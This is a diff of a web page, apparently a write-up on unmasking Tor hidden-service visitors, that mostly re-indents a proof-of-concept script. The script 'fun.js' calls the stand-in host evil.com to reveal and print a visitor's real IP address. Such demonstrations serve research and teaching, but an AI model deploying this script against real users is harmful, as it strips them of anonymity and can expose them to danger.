@@ -60,12 +60,13 @@
 <li>illegaldrugsq2wm.onion/poc.php (this is a fake hidden service)</li>
 </ul>
 <p>fun.js</p>
+<h1>!javascript</h1>
 <div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">httpGet</span><span class="p">()</span>
 <span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://evil.com/ip.php&quot;</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>
-    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span> <span class="kc">null</span> <span class="p">);</span>
-    <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+   <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+   <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;http://evil.com/ip.php&quot;</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>
+   <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span> <span class="kc">null</span> <span class="p">);</span>
+   <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;Real IP: &quot;</span> <span class="o">+</span> <span class="nx">httpGet</span><span class="p">());</span>
